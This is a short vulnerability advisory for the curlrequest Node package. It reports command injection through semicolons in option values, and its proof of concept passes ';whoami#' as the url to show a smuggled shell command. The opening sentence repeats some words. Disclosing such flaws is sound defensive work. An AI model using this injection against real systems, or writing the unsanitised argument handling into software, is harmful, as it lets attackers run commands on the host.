# Overview

curlrequest is a curlrequest is a node wrapper for the command line curl.

Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands by using a semicolon char in any of the options values.

## Proof of Concept

```
var curl = require("curlrequest");

let userPayload = ";whoami#";
curl.request({ url: userPayload, pretend: true }, function(err, stdout, meta) {
  console.log("%s %s", meta.cmd, meta.args.join(" "));
});
```
